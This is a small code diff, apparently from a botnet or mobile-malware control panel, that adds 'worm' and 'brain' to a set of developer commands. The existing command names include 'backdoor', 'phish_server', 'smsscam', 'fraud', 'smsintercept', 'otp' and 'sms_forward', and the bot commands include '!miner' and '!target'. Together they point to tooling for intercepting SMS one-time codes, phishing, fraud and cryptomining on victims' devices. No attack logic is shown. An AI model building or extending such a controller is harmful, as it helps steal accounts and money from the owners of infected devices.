@@ -122,6 +122,7 @@ export const DEV_CMDS = new Set([
   'screenstream', 'kill', 'backdoor', 'dns', 'router', 'phish_server', 'help',
   'smsscam', 'premium', 'fraud', 'carrier', 'smsi', 'smsintercept', 'intercept', 'otp',
   'sms_list', 'smscaptured', 'sms_auto', 'autoreply', 'smsreply', 'sms_forward', 'smsfwd',
+  'worm', 'brain',
 ])
 
 export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign', '!analyze', '!d']
